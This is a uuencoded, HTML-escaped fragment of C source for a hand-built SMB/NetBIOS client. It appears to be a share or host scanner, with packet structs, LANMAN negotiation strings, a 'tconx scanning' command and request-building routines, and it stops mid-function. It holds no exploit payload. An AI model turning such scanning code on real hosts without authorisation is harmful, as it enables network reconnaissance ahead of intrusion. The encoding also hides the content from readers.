M;F5D(&amp;-H87(@#0H-&quot;B-D969I;F4)=5]C:&amp;%R&quot;75N&lt;VEG;F5D(&amp;-H87(-&quot;@T*
M(V1E9FEN90E334)?4%)/5$]#3TQ3&quot;2)&lt;&gt;#4P7&#039;@T,UQX,C!&lt;&gt;#1E7`T*7&#039;@T
M-5QX-31&lt;&gt;#4W7&#039;@T9EQX-3)&lt;&gt;#1B7&#039;@R,%QX-3!&lt;&gt;#4R7&#039;@T9EQX-#=&lt;&gt;#4R
M7&#039;@T,5QX-&amp;1&lt;&gt;#(P7&#039;@S,5P-&quot;EQX,F5&lt;&gt;#,P7&#039;@P,%QX,#)&lt;&gt;#1D7&#039;@T.5QX
M-#-&lt;&gt;#4R7&#039;@T9EQX-3-&lt;&gt;#1F7&#039;@T-EQX-31&lt;&gt;#(P7&#039;@T95QX-#5&lt;#0I&lt;&gt;#4T
M7&#039;@U-UQX-&amp;9&lt;&gt;#4R7&#039;@T8EQX-3-&lt;&gt;#(P7&#039;@S,5QX,F5&lt;&gt;#,P7&#039;@S,UQX,#!&lt;
M&gt;#`R7&#039;@T9%QX-#E&lt;&gt;#0S7`T*7&#039;@U,EQX-&amp;9&lt;&gt;#4S7&#039;@T9EQX-#9&lt;&gt;#4T7&#039;@R
M,%QX-&amp;5&lt;&gt;#0U7&#039;@U-%QX-3=&lt;&gt;#1F7&#039;@U,EQX-&amp;)&lt;&gt;#4S7&#039;@R,%P-&quot;EQX,S-&lt;
M&gt;#)E7&#039;@S,%QX,#!&lt;&gt;#`R7&#039;@T8UQX-#%&lt;&gt;#1E7&#039;@T9%QX-#%&lt;&gt;#1E7&#039;@S,5QX
M,F5&lt;&gt;#,P7&#039;@P,%QX,#)&lt;#0I&lt;&gt;#1C7&#039;@T9%QX,S%&lt;&gt;#)E7&#039;@S,EQX-3A&lt;&gt;#,P
M7&#039;@S,%QX,S)&lt;&gt;#`P7&#039;@P,EQX-3-&lt;&gt;#8Q7&#039;@V9%QX-C)&lt;&gt;#8Q7`T*7&#039;@P,%QX
M,#)&lt;&gt;#1E7&#039;@U-%QX,C!&lt;&gt;#1C7&#039;@T,5QX-&amp;5&lt;&gt;#1D7&#039;@T,5QX-&amp;5&lt;&gt;#(P7&#039;@S
M,5QX,F5&lt;&gt;#,P7&#039;@P,%P-&quot;EQX,#)&lt;&gt;#1E7&#039;@U-%QX,C!&lt;&gt;#1C7&#039;@T9%QX,C!&lt;
M&gt;#,P7&#039;@R95QX,S%&lt;&gt;#,R(B`@(&quot;`@(&quot;`@(&quot;`)#0H-&quot;B\J5&amp;AE(&amp;YA=&amp;EV92!O
M&lt;R!A;F0@;&amp;%N;6%N(&amp;-L:65N=&quot;P@9F]R(&#039;5S(#H@56YI&gt;&quot;Y386UB82HO#0H-
M&quot;B-D969I;F4@3D%4259%7T]37TQ!3DU!3@DB7&#039;@U-5QX-F5&lt;&gt;#8Y7&#039;@W.%QX
M,#!&lt;&gt;#4S7&#039;@V,5QX-F1&lt;#0I&lt;&gt;#8R7&#039;@V,2(-&quot;@T*+RI4:&amp;4@0V]M;6%N9&quot;!F
M;W(@=&amp;-O;G@@&lt;V-A;FYI;F&lt;@.B`B/S\_/S\B*B\-&quot;@T*(V1E9FEN92!40T].
M6%]#3TU-04Y$(&quot;)&lt;&gt;#0Y7&#039;@U,%QX-#-&lt;&gt;#(T7&#039;@P,%QX,V9&lt;&gt;#-F7&#039;@S9EQX
M,V9&lt;&gt;#-F(B`-&quot;@T*#0HO*E1H92!205`@8V]M;6%N9&quot;!A;F0@=&amp;AE(%Q0:7!E
M7&amp;QA;FUA;B!S=&#039;)I;F&lt;J+PT*#0HC9&amp;5F:6YE($Y!345?4D%07T-/34U!3D0)
M(EQX-6-&lt;&gt;#4P7&#039;@T.5QX-3!&lt;&gt;#0U7&#039;@U8UQX-&amp;-&lt;&gt;#0Q7&#039;@T95P-&quot;EQX-&amp;1&lt;
M&gt;#0Q7&#039;@T95QX,#!&lt;&gt;#`P7&#039;@P,%QX-3=&lt;&gt;#&lt;R7&#039;@T8UQX-C5&lt;&gt;#8X7&#039;@P,%QX
M-#)&lt;&gt;#,Q7&#039;@S,UQX-#)&lt;&gt;#4W7`T*7&#039;@W85QX,#!&lt;&gt;#`Q7&#039;@P,%QX9F9&lt;&gt;&amp;9F
M(@T*+RHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*@T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!35%)50U154D53#0HJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHO&quot;0D)(&quot;`@(&quot;`-&quot;G1Y&lt;&amp;5D968@&lt;W1R=6-T#0I[#0H@=5]I;G0X7W0@
M4&#039;)O=&amp;]C;VQ;-%T[&quot;2\J0V]N=&amp;%I;G,@,&#039;A&amp;1BPG4TU&quot;)RHO#0H@=5]I;G0X
M7W0@0V]M;6%N9#L)+RI#;VUM86YD($-O9&amp;4J+PT*(&#039;5N:6]N(`T*(&#039;L-&quot;B`@
M&lt;W1R=6-T#0H@(&#039;L-&quot;B`@(&#039;5?:6YT.%]T($5R&lt;F]R0VQA&lt;W,[&quot;2\J17)R;W(@
M0VQA&lt;W,J+PT*(&quot;`@=5]I;G0X7W0@4F5S97)V960[&quot;2\J4F5S97)V960@9F]R
M(&amp;9U=&#039;5R92!U&lt;V4J+R`-&quot;B`@(&#039;5?:6YT.%]T($5R&lt;F]R6S)=.PDO*D5R&lt;F]R
M($-O9&amp;4J+PT*(&quot;!]($1O&lt;T5R&lt;F]R.PT*(&quot;!U7VEN=#A?=&quot;!3=&amp;%T=7-;-%T[
M&quot;2\J,S(M8FET&lt;R!E&lt;G)O&lt;B!C;V1E*B\-&quot;B!](%-T871U&lt;R`[#0H@=5]I;G0X
M7W0@1FQA9W,[&quot;2\J1FQA9W,J+PT*(&#039;5?:6YT.%]T($9L86=S,ELR73L)+RI-
M;W)E($9L86=S*B\-&quot;B!U;FEO;@T*(&#039;L-&quot;B`@=5]I;G0X7W0@4&amp;%D6S$R73L-
M&quot;B`@&lt;W1R=6-T#0H@(&#039;L-&quot;B`@(&#039;5?:6YT.%]T(%!I9$AI9VA;,ET[&quot;2\J2&amp;EG
M:&quot;!087)T(&amp;]F(&#039;1H92!0:60J+PT*(&quot;`@=5]I;G0X7W0@56YU&lt;V5D6S1=.PDO
M*DYO=&quot;!5&lt;V5D*B\-&quot;B`@(&#039;5?:6YT.%]T(%5N=7-E9#);-%T[&quot;2\J3F]T(%5S
M960J+PT*(&quot;!]($5X=&#039;)A.PT*(&#039;T@4&amp;%D17AT&lt;F$[#0H@=5]I;G0X7W0@5&amp;ED
M6S)=.PDO*E1R964@261E;G1I9FEE&lt;BHO#0H@=5]I;G0X7W0@4&amp;ED6S)=.PDO
M*D-A;&amp;QE&lt;B=S(&#039;!R;V-E&lt;W,@240J+PT*(&#039;5?:6YT.%]T(%5I9%LR73L)+RI5
M;F%U=&amp;AE;G1I8V%T960@=7-E&lt;B!)1&quot;HO#0H@=5]I;G0X7W0@36ED6S)=.PDO
M*DUU;&#039;1I&lt;&amp;QE&gt;&quot;!)9&quot;HO#0I](%-M8D)A&lt;V5(9&#039;(@.PT*#0IT&gt;7!E9&amp;5F(&#039;-T
M&lt;G5C=&quot;`-&quot;GL-&quot;B!U7VEN=#A?=&quot;!7;W)D0V]U;G0[+RI#;W5N=&quot;!O9B!P87)A
M;65T97(@=V]R9&#039;,@/3$W*B\-&quot;B!U7VEN=#A?=&quot;!$:6%L96-T26YD97A;,ET[
M+RI);F1E&gt;&quot;!O9B!S96QE8W1E9&quot;!D:6%L96-T*B\-&quot;B!U7VEN=#A?=&quot;!396-U
M&lt;FET&gt;4UO9&amp;4[&quot;2\J4V5C=7)I=&#039;D@36]D92`Z*B\-&quot;@D)&quot;2\J8FET(#`@.B`P
M/7-H87)E+&quot;`Q/75S97(J+PT*&quot;0D)+RIB:70@,2`Z(#$]96YC&lt;GEP=&quot;!P87-S
M=V]R9&#039;,J+PT*(&#039;5?:6YT.%]T($UA&gt;$UP&gt;$-O=6YT6S)=.R\J36%X(%!E;F1I
M;F&lt;@;75L=&amp;EP;&amp;5X960@&lt;F5Q=65S=&quot;HO#0H@=5]I;G0X7W0@36%X3G5M8F5R
M&lt;U9C&lt;ULR73LO*DUA&gt;&quot;!60W,@8F5T=V5E96X@8VQI96YT(&amp;%N9&quot;!S97)V97(J
M+PT*(&#039;5?:6YT.%]T($UA&gt;$)U9F9E&lt;E-I&gt;F5;-%T[+RI-87@@=&#039;)A;G-M:70@
M8G5F9F5R(&#039;-I&gt;F4J+PT*(&#039;5?:6YT.%]T($UA&gt;%)A=U-I&gt;F5;-%T[+RI-87@@
M&lt;F%W(&amp;)U9F9E&lt;B!S:7IE*B\-&quot;B!U7VEN=#A?=&quot;!397-S:6]N2V5Y6S1=.R\J
M56YI&lt;75E(&#039;1O:V5N(&amp;ED96YT:69Y:6YG(&#039;1H:7,@&lt;V5S&lt;VEO;BHO#0H@=5]I
M;G0X7W0@0V%P86)I;&amp;ET:65S6S1=.R\J4V5R=F5R($-A&lt;&amp;%B:6QI=&amp;EE&lt;RHO
M#0H@=5]I;G0X7W0@4WES=&amp;5M5&amp;EM94QO=ULT73LO*E-Y&lt;W1E;2`H551#*2!T
M:6UE(&amp;]F(&#039;1H92!S97)V97(@*&amp;QO=RDJ+PT*(&#039;5?:6YT.%]T(%-Y&lt;W1E;51I
M;65(:6=H6S1=.R\J4WES=&amp;5M(&quot;A55$,I(&#039;1I;64@;V8@=&amp;AE(&#039;-E&lt;G9E&lt;B`H
M:&amp;EG:&quot;DJ+PT*(&#039;5?:6YT.%]T(%-E&lt;G9E&lt;E1I;65:;VYE6S)=.R\J5&amp;EM92!Z
M;VYE(&amp;]F(&#039;-E&lt;G9E&lt;B`H;6EN(&amp;9R;VT@551#*2HO#0H@=5]I;G0X7W0@16YC
M&lt;GEP=&amp;EO;DME&gt;4QE;F=T:#LO*DQE;F=T:&quot;!O9B!E;F-R&gt;7!T:6]N($ME&gt;2HO
M#0H@=5]I;G0X7W0@0GET94-O=6YT6S)=.PDO*D-O=6YT(&amp;]F(&amp;1A=&amp;$@8GET
M97,J+PT*?2!3;6).96=0&lt;F]T4F5P;&#039;E(9&#039;([(`T*#0IT&gt;7!E9&amp;5F(&#039;-T&lt;G5C
M=&quot;`-&quot;GL-&quot;B!U7VEN=#A?=&quot;!7;W)D0V]U;G0[#0H@=5]I;G0X7W0@0GET94-O
M=6YT6S)=.PT*(&#039;5?:6YT.%]T($)U9F9E&lt;D9O&lt;FUA=#L-&quot;GT@4VUB3F5G4&#039;)O
M=%)E&lt;75E&lt;W1(9&#039;([(`T*#0H-&quot;G1Y&lt;&amp;5D968@&lt;W1R=6-T#0I[#0H@=5]I;G0X
M7W0@5V]R9$-O=6YT.R\J0V]U;G0@;V8@&lt;&amp;%R86UE=&amp;5R(&#039;=O&lt;F1S/3$S(&quot;AR
M97%U97-T*2HO#0H@=5]I;G0X7W0@06YD6$-O;6UA;F0[+RIS96-O;F1A&lt;GD@
M*%@I(&amp;-O;6UA;F0L,&#039;A&amp;1B`](&amp;YO;F4J+PT*(&#039;5?:6YT.%]T($%N9%A297-E
M&lt;G9E9#LO*G)E&lt;V5R=F5D(&quot;AM=7-T(&amp;)E(&#039;IE&lt;F\I*B\-&quot;B!U7VEN=#A?=&quot;!!
M;F183V9F&lt;V5T6S)=.R\J;V9F&lt;V5T(&#039;1O(&amp;YE&gt;&#039;0@8V]M;6%N9&quot;!7;W)D8V]U
M;G0J+PT*(&#039;5?:6YT.%]T($UA&gt;$)U9F9E&lt;E-I&gt;F5;,ET[+RI#;&amp;EE;G0G&lt;R!M
M87AI;75N(&amp;)U9F9E&lt;B!S:7IE*B\-&quot;B!U7VEN=#A?=&quot;!-87A-&lt;&#039;A#;W5N=%LR
M73LO*F%C=&#039;5A;&quot;!M87AI;75N(&amp;UU;&#039;1I&lt;&amp;QE&gt;&amp;5D(&#039;!E;F1I;F&lt;@&lt;F5Q=65S
M=&quot;HO#0H@=5]I;G0X7W0@5F-.=6UB97);,ET[+RHP/69I&lt;G-T(&quot;AO;FQY*2P@
M;F]N&gt;F5R;RUA9&amp;1I=&amp;EO;F%L(%9#(&amp;YU;6)E&lt;BHO#0H@=5]I;G0X7W0@4V5S
M&lt;VEO;DME&gt;5LT73LO*G-E&lt;W-I;VX@:V5Y(&quot;AV86QI9&quot;!O;FQY(&amp;EF(&#039;-M8E]V
M8U]M=6XA/3`J+PT*(&#039;5?:6YT.%]T($-A&lt;V5);G-E;G-I=&amp;EV95!A&lt;W-W;W)D
M3&amp;5N9W1H6S)=.R`O*D%.4TD@&lt;&amp;%S&lt;W=O&lt;F0@&lt;VEZ92HO#0H@=5]I;G0X7W0@
M0V%S95-E;G-I=&amp;EV95!A&lt;W-W;W)D3&amp;5N9W1H6S)=.R`O*E5.24-/1$4@&lt;&amp;%S
M&lt;W=O&lt;F0@&lt;VEZ92HO#0H@=5]I;G0X7W0@4F5S97)V961;-%T[&quot;2\J&lt;F5S97)V
M960@*&amp;UU&lt;W0@8F4@,&quot;DJ+PT*(&#039;5?:6YT.%]T($-A&lt;&amp;%B:6QI=&amp;EE&lt;ULT73LO
M*F-L:65N=&quot;!C87!A8FEL:71I97,J+PT*(&#039;5?:6YT.%]T($)Y=&amp;5#;W5N=%LR
M73L)+RI#;W5N=&quot;!O9B!D871A(&amp;)Y=&amp;5S.VUI;CTP*B\-&quot;GT@4VUB4V5T=7!8
M4F5Q=65S=$AD&lt;B`[#0H-&quot;G1Y&lt;&amp;5D968@&lt;W1R=6-T#0I[#0H@=5]I;G0X7W0@
M5V]R9$-O=6YT.PDO*G9A;&#039;5E/30@*B\-&quot;B!U7VEN=#A?=&quot;!!;F180V]M;6%N
M9#L)+RIS96-O;F1A&lt;GD@*%@I(&amp;-O;6UA;F0L,&#039;A&amp;1B`](&amp;YO;F4J+PT*(&#039;5?
M:6YT.%]T($%N9%A297-E&lt;G9E9#L)+RIR97-E&lt;G9E9&quot;`H;75S=&quot;!B92!Z97)O
M*2HO#0H@=5]I;G0X7W0@06YD6$]F9G-E=%LR73LO*F]F9G-E=&quot;`H9G)O;2!3
M34(@:&amp;1R(&#039;-T87)T(&#039;1O(&amp;YE&gt;&#039;0@8VUD(&quot;HO#0H@=5]I;G0X7W0@1FQA9W-;
M,ET[+RI!9&amp;1I=&amp;EO;F%L(&amp;EN9F]R;6%T:6]N(&amp;)I=&quot;`P(&#039;-E=#UD:7-C;VYN
M96-T(%1I9&quot;`J+PT*(&#039;5?:6YT.%]T(%!A&lt;W-W;W)D3&amp;5N9W1H6S)=.PDO*DQE
M;F=T:&quot;!O9B!P87-S=V]R9&quot;HO#0H@=5]I;G0X7W0@0GET94-O=6YT6S)=.PDO
M*D-O=6YT(&amp;]F(&amp;1A=&amp;$@8GET97,@.R!M:6X],RHO#0I](%-M8E1C;VY84F5Q
M=65S=$AD&lt;B`[#0H-&quot;G1Y&lt;&amp;5D968@&lt;W1R=6-T#0I[#0H@=5]I;G0X7W0@5V]R
M9$-O=6YT.R\J0V]U;G0@;V8@&lt;&amp;%R86UE=&amp;5R(&#039;=O&lt;F1S/3!X,RHO#0H@=5]I
M;G0X7W0@06YD6$-O;6UA;F0[+RI396-O;F1A&lt;GD@*%@I(&amp;-O;6UA;F0[(#!X
M1D8];F]N92HO#0H@=5]I;G0X7W0@06YD6%)E&lt;V5R=F5D6S)=.R\J4F5S97)V
M960@*&amp;UU&lt;W0@8F4@&gt;F5R;RDJ+PT*(&#039;5?:6YT.%]T($]P=&amp;EO;F%L4W5P&lt;&amp;]R
M=%LR73LO*D]P=&amp;EO;F%L(%-U&lt;&#039;!O&lt;G0@8FET&lt;RHO#0H@=5]I;G0X7W0@0GET
M94-O=6YT6S)=.PDO*D-O=6YT(&amp;]F(&amp;1A=&amp;$@8GET97,J+PT*?2!3;6)48V]N
M6%)E&lt;&amp;QY2&amp;1R.PT*(&quot;`-&quot;G1Y&lt;&amp;5D968@&lt;W1R=6-T#0I[#0H@=5]I;G0X7W0@
M5V]R9$-O=6YT.R\J0V]U;G0@;V8@&lt;&amp;%R86UE=&amp;5R(&#039;=O&lt;F0L(&#039;9A;&#039;5E/3$T
M*U-E=&#039;5P0V]U;G0J+PT*(&#039;5?:6YT.%]T(%1O=&amp;%L4&amp;%R86UE=&amp;5R0V]U;G1;
M,ET[(&quot;\J5&amp;]T86P@&lt;&amp;%R86UE=&amp;5R(&amp;)E:6YG(&#039;-E;G0J+PT*(&#039;5?:6YT.%]T
M(%1O=&amp;%L1&amp;%T84-O=6YT6S)=.PDO*E1O=&amp;%L($1A=&amp;$@8GET97,@8F5I;F&lt;@
M&lt;V5N=&quot;HO#0H@=5]I;G0X7W0@36%X4&amp;%R86UE=&amp;5R0V]U;G1;,ET[&quot;2\J36%X
M(%!A&lt;F%M971E&lt;B!B&gt;71E&lt;R!T;R!R971U&lt;FXJ+PT*(&#039;5?:6YT.%]T($UA&gt;$1A
M=&amp;%#;W5N=%LR73L)+RI-87@@1&amp;%T82!B&gt;71E&lt;R!T;R!R971U&lt;FXJ+PT*(&#039;5?
M:6YT.%]T($UA&gt;%-E=&#039;5P0V]U;G0[&quot;2\J36%X(&#039;-E=&#039;5P(&#039;=O&lt;F1S(&#039;1O(&#039;)E
M=&#039;5R;BHO#0H@=5]I;G0X7W0@4F5S97)V960[#0H@=5]I;G0X7W0@1FQA9W-;
M,ET[#0H@=5]I;G0X7W0@5&amp;EM96]U=%LT73L-&quot;B!U7VEN=#A?=&quot;!297-E&lt;G9E
M9#);,ET[#0H@=5]I;G0X7W0@4&amp;%R86UE=&amp;5R0V]U;G1;,ET[+RI087)A;65T
M97(@8GET97,@&lt;V5N=&quot;!I;B!T:&amp;ES(&#039;!A8VME=&quot;HO#0H@=5]I;G0X7W0@4&amp;%R
M86UE=&amp;5R3V9F&lt;V5T6S)=.R\J3V9F&lt;V5T(&#039;1O(&#039;!A&lt;F%M971E&lt;BHO#0H@=5]I
M;G0X7W0@1&amp;%T84-O=6YT6S)=.PDO*D1A=&amp;$@8GET97,@&lt;V5N=&quot;!I;B!T:&amp;ES
M(&#039;!A8VME=&quot;HO#0H@=5]I;G0X7W0@1&amp;%T84]F9G-E=%LR73LO*D]F9G-E=&quot;!T
M;R!D871A*B\-&quot;B!U7VEN=#A?=&quot;!3971U&lt;$-O=6YT.R\J0V]U;G0@;V8@&lt;V5T
M=7`@=V]R9&#039;,J+PT*(&#039;5?:6YT.%]T(%)E&lt;V5R=F5D,SLO*E5S92!T;R!P860@
M=&amp;\@=V]R9&quot;HO#0H@=5]I;G0X7W0@0GET94-O=6YT6S)=.PDO*E-E=&#039;5P8V]U
M;G0@/2`P(&#039;-O(&#039;=E(&amp;-A;B!D;R!T:&amp;ES*B\-&quot;GT@4VUB5&#039;)A;G-297%U97-T
M2&amp;1R.PT*(`T*#0IT&gt;7!E9&amp;5F(&#039;-T&lt;G5C=`T*&gt;PT*(&#039;5?:6YT.%]T(%=O&lt;F1#
M;W5N=#LO*D-O=6YT(&amp;]F(&#039;!A&lt;F%M971E&lt;B!W;W)D+&quot;!V86QU93TQ-&quot;M3971U
M&lt;$-O=6YT*B\-&quot;B!U7VEN=#A?=&quot;!4;W1A;%!A&lt;F%M971E&lt;D-O=6YT6S)=.R\J
M5&amp;]T86P@&lt;&amp;%R86UE=&amp;5R(&amp;)E:6YG(&#039;-E;G0J+PT*(&#039;5?:6YT.%]T(%1O=&amp;%L
M1&amp;%T84-O=6YT6S)=.R\J5&amp;]T86P@1&amp;%T82!B&gt;71E&lt;R!B96EN9R!S96YT*B\-
M&quot;B!U7VEN=#A?=&quot;!297-E&lt;G9E9%LR73L-&quot;B!U7VEN=#A?=&quot;!087)A;65T97)#
M;W5N=%LR73LO*E!A&lt;F%M971E&lt;B!B&gt;71E&lt;R!S96YT(&amp;EN(&#039;1H:7,@&lt;&amp;%C:V5T
M*B\-&quot;B!U7VEN=#A?=&quot;!087)A;65T97)/9F9S971;,ET[+RI/9F9S970@=&amp;\@
M&lt;&amp;%R86UE=&amp;5R&lt;RHO#0H@=5]I;G0X7W0@4&amp;%R86UE=&amp;5R1&amp;ES&lt;&amp;QA8V5M96YT
M6S)=.R\J1&amp;ES&lt;&amp;QA8V5M96YT(&amp;]F(&#039;!A&lt;F%M971E&lt;B!B&gt;71E&lt;RHO#0H@=5]I
M;G0X7W0@1&amp;%T84-O=6YT6S)=.R\J1&amp;%T82!B&gt;71E&lt;R!S96YT(&amp;EN(&#039;1H:7,@
M&lt;&amp;%C:V5T*B\-&quot;B!U7VEN=#A?=&quot;!$871A3V9F&lt;V5T6S)=.R\J3V9F&lt;V5T(&#039;1O
M(&amp;1A=&amp;$J+PT*(&#039;5?:6YT.%]T($1A=&amp;%$:7-P;&amp;%C96UE;G1;,ET[+RI$:7-P
M;&amp;%C96UE;G0@;V8@9&amp;%T82!B&gt;71E&lt;RHO#0H@=5]I;G0X7W0@4V5T=7!#;W5N
M=#LO*D-O=6YT(&amp;]F(&#039;-E=&#039;5P(&#039;=O&lt;F1S*B\-&quot;B!U7VEN=#A?=&quot;!297-E&lt;G9E
M9#([+RI5&lt;V4@=&amp;\@&lt;&amp;%D(&#039;1O(&#039;=O&lt;F0J+PT*(&#039;5?:6YT.%]T($)Y=&amp;5#;W5N
M=%LR73LO*E-E=&#039;5P8V]U;G0@/2`P(&#039;-O(&#039;=E(&amp;-A;B!D;R!T:&amp;ES*B\-&quot;GT@
M4VUB5&#039;)A;G-297!L&gt;4AD&lt;CL-&quot;B`-&quot;G1Y&lt;&amp;5D968@&lt;W1R=6-T#0I[#0H@=5]I
M;G0X7W0@5&#039;EP93L)+RIT&gt;7!E*B\)#0H@=5]I;G0X7W0@1FQA9W,[+RIF;&amp;%G
M&lt;RHO#0H@=5]I;G0Q-E]T($QE;F=T:#LO*FQE;F=T:&quot;!O9B!T:&amp;4@3D)4(&#039;-E
M&lt;W-I;VX@&lt;&amp;%C:V5T*B\-&quot;GT@3F)T4V5S&lt;VEO;DAD&lt;CL-&quot;@T*+RHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*@T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M($953D-424].4PT**BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ+PT*=F]I9&quot;!3
M96YD3F5T0FEO&lt;TYA;65297%U97-T*&amp;EN=&quot;P@8VAA&lt;B`J+&quot;!C:&amp;%R(&quot;HI.PT*
M#0IV;VED(%-E;F1.96=0&lt;F]T4F5Q=65S=&quot;AI;G0I.PT*#0IC:&amp;%R(&quot;I296-E
M:79E3F5G4&#039;)O=%)E&lt;&amp;QY*&amp;EN=&quot;P@:6YT(&quot;HI.PT*#0IV;VED(%-E;F13971U
M&lt;%A297%U97-T*&amp;EN=&quot;P@:6YT(&quot;QC:&amp;%R(&quot;HI.PT*#0IV;VED(%-E;F148V]N
M6%)E&lt;75E&lt;W0H:6YT+&quot;!U7V-H87(@*BD[#0H-&quot;G9O:60@4F5C96EV951C;VY8
M4F5P;&#039;DH:6YT+&quot;!U7VEN=#A?=&quot;`J*3L-&quot;@T*=F]I9&quot;!396YD5&#039;)A;G-297%U
M97-T*&amp;EN=&quot;P@=5]I;G0X7W0@*BD[#0H-&quot;G9O:60@4F5C96EV951R86YS4F5P
M;&#039;DH:6YT*3L-&quot;B\J*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BH-&quot;B`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@5$A%($-/1$4-&quot;BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*B\-&quot;@T*+RI4:&amp;ES(&#039;-O=7)C92!C;V1E(&amp;-O;G1A:6YS(&amp;%L
M;&quot;!T:&amp;4@&lt;&#039;)O=&amp;]T&gt;7!E&lt;R!A;F0@#0H@*B!D969I;FET:6]N&lt;R!O9B!T:&amp;4@
M9G5N8W1I;VYS(&#039;1H870@87)E(&#039;5S960-&quot;B`J(&#039;1O(&amp;)U:6QD(&amp;$@4TU&quot;(&amp;)A
M&lt;V4@:&amp;5A9&amp;5R+&quot;!.151&quot;24]3(&amp;AE861E&lt;@T*(&quot;H@86YD(&#039;1O(&amp;5N8V]D92!A
M($Y%5$))3U,@;F%M92`J+PT*#0H-&quot;B\J5&amp;\@8G5I;&amp;0@82!.151&quot;24]3(%-E
M&lt;W-I;VX@2&amp;5A9&amp;5R*B\-&quot;@T*=F]I9&quot;!&quot;=6EL9$YB=&quot;@-&quot;B`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@+RI/=7(@&lt;&amp;%C:V5T*B\-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@=5]C:&amp;%R(&quot;I086-K
M970L#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;\J($)Y=&amp;4@8V]U;G0@;V8@9&amp;%T82`-&quot;B`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;H@*&#039;=H870@:7,@;W9E&lt;B!T:&amp;4@;F5T8FEO&lt;R!H96%D
M97(I*B\@(&quot;`@(&quot;`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@:6YT(%!A8VME=$QE;F=T:&quot;D@
M#0I[#0H@3F)T4V5S&lt;VEO;DAD&lt;B`J3F)T4V5S&lt;VEO;CL-&quot;@T*+RI#;&amp;5A;B!T
M:&amp;4@&lt;&amp;%C:V5T*B\-&quot;@T*(&amp;UE;7-E=&quot;A086-K970L,&quot;Q086-K971,96YG=&amp;@K
M&lt;VEZ96]F*$YB=%-E&lt;W-I;VY(9&#039;(I*3L-&quot;@T*($YB=%-E&lt;W-I;VX@/2`H3F)T
M4V5S&lt;VEO;DAD&lt;B`J*2`H4&amp;%C:V5T*3L-&quot;@T*(&quot;\J(E1Y&lt;&amp;4B(#T@,&#039;@P,&quot;!A
M;F0@(D9L86=S(B`](#!X,#`L(`T*(&quot;`J(&amp;)E8V%U&lt;V4@=V4@=7-E(&amp;$@&lt;V5S
M&lt;VEO;B!M97-S86=E(&#039;!A8VME=`T*(&quot;`J(&#039;=I=&amp;@@3D540DE/4RP-&quot;B`@*B`B
M3&amp;5N9W1H(B!I&lt;R!E&lt;75A;&quot;!T;R!T:&amp;4-&quot;B`@*B!A;6]U;G0@;V8@9&amp;%T82!O
M=F5R(&#039;1H92`-&quot;B`@*B!.151&quot;24]3(&amp;AE861E&lt;BHO#0H-&quot;@T*($YB=%-E&lt;W-I
M;VXM/E1Y&lt;&amp;4],&#039;@P.PT*#0H@3F)T4V5S&lt;VEO;BT^1FQA9W,],&#039;@P.PT*#0H@
M3F)T4V5S&lt;VEO;BT^3&amp;5N9W1H/6AT;VYS*%!A8VME=$QE;F=T:&quot;D[#0I]#0H-
M&quot;B\J5&amp;\@8G5I;&amp;0@82!334(@8F%S92!H96%D97(J+PT*#0IV;VED($)U:6QD
M4VUB0F%S94AD&lt;B@-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;\J3W5R(&#039;!A8VME
M=&quot;HO#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!U7V-H87(@*E!A8VME=&quot;P-&quot;B`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;\J5&amp;AE(&amp;-O;6UA;F0@8V]D92HO#0H@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!U7V-H87(@0V]D92D@#0I[#0H@4VUB0F%S94AD
M&lt;B`J4VUB0F%S93L-&quot;@T*(%-M8D)A&lt;V4@/2`H4VUB0F%S94AD&lt;B`J*2`H4&amp;%C
M:V5T(&quot;L@&lt;VEZ96]F*$YB=%-E&lt;W-I;VY(9&#039;(I*3L-&quot;@T*+RI4:&amp;4@9FEE;&amp;0@
M(E!R;W1O8V]L(B!C;VYT86EN=&#039;,@(E--0B(@86YD(&#039;1H92!C:&amp;%R86-T97)S
M(#!X9F8J+PT*#0H@4VUB0F%S92T^4&#039;)O=&amp;]C;VQ;,5T])U,G.PT*(%-M8D)A
M&lt;V4M/E!R;W1O8V]L6S)=/2=-)SL-&quot;B!3;6)&quot;87-E+3Y0&lt;F]T;V-O;%LS73TG
M0B&lt;[#0H@4VUB0F%S92T^4&#039;)O=&amp;]C;VQ;,%T],&#039;AF9CL-&quot;B`-&quot;B!3;6)&quot;87-E
